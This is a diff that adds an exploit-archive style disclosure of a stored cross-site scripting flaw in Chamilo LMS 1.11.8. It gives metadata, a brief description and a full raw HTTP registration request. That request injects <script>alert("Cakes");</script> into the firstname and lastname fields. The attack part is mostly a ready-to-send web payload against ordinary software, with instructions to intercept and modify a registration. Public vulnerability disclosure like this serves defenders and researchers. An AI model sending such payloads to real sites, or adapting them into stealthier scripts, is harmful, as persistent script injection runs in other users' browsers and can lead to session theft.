@@ -1,0 +1,32 @@
+# Exploit Title: Chamilo LMS 1.11.8 - 'firstname' Cross-Site Scripting
+# Author: Cakes
+# Discovery Date: 2018-10-06
+# Vendor Homepage: https://chamilo.org
+# Software Link: https://github.com/chamilo/chamilo-lms/releases/download/v1.11.8/chamilo-1.11.8-php5.zip
+# Tested Version: 1.11.8 for php5
+# Tested on OS: Kali Linux
+# CVE: N/A
+  
+# Description:
+# Improper input validation on the Firstname and Lastname fields allow attackers to add a persistent 
+# Cross-Site scripting attack when registering as a new user
+# Simply intercept a new registration request and add in the XSS in the firstname / lastname fields.
+
+# I'm sure there are more exploit vectors on this software. No time to check, had to move along.
+  
+# PoC
+
+POST /chamillo/main/auth/inscription.php HTTP/1.1
+Host: 10.0.0.16
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Referer: http://10.0.0.16/chamillo/main/auth/inscription.php
+Cookie: ch_sid=ac092r01e7cnoco62rejshocq4
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 213
+
+status=5&firstname=<script>alert("Cakes");</script>&lastname=<script>alert("Cakes");</script>&email=cakes%40testers.com&username=cakez&pass1=123456&pass2=123456&phone=&language=english&official_code=&extra_skype=&extra_linkedin_url=&submit=&_qf__registration=&item_id=0
